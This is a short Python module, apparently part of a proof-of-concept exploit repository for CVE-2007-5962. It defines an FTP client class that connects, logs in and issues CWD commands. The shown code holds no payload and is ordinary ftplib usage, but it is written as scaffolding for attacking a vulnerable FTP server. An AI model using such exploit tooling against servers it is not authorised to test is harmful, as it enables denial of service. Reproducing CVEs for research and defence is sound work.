#!coding=utf-8
#	
#	[+] this script was created from: antogit-sys
#	[+] URL: https://github.com/antogit-sys/CVE-2007-5962
#	[+] LICENSE: GPLv3
#
from time import sleep
import  ftplib
class exploitModuleFTP:
	def __init__(self, ip, port):
		self.ip = ip
		self.port = port
		self.ftp = ftplib.FTP()
	
	def connectServer(self):
		done = False
		try:
			done = self.ftp.connect(self.ip, self.port)
			sleep(1)
		except (ConnectionRefusedError, EOFError, OSError):
			pass
		return done 

	def close_connection(self):
		self.ftp.close()
	
	def send_usr(self, usr):
		return self.ftp.sendcmd("USER "+usr)

	def send_passwd(self, passwd):
		return self.ftp.sendcmd("PASS "+passwd)
	
	def login(self, username, password):
		done = False
		try:
			usr_done = self.send_usr(username)
			passwd_done = self.send_passwd(password)
			done = usr_done + "\n"+ passwd_done
		except ftplib.error_perm:
			pass
		return done

	def changeDir(self, cd):
		return self.ftp.cwd(cd)
	
